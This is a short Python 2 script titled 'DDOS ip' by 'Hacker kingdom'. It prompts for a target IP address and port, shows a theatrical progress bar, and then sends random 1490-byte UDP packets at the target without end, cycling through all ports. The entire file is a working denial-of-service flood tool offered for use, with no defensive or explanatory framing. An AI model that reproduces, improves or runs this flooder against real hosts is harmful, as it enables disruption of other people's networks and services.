import os,sys

os.system ("figlet Hacker kingdom | lolcat ")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS ip | lolcat ")
print
print "\033[1m\033[32m Python Programing By Hacker kingdom TH"
ip = raw_input("IP target@ : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack !! | lolcat")
print "[                     ] 0%Hacking "
time.sleep(3)
print "[====+>               ] 25Hacking%"
time.sleep(3)
print "[=========+>          ] 50%Hacking"
time.sleep(3)
print "[==============+>     ] 75%Hacking"
time.sleep(3)
print "[==================+>] 100%Hacking"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s Attack  port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
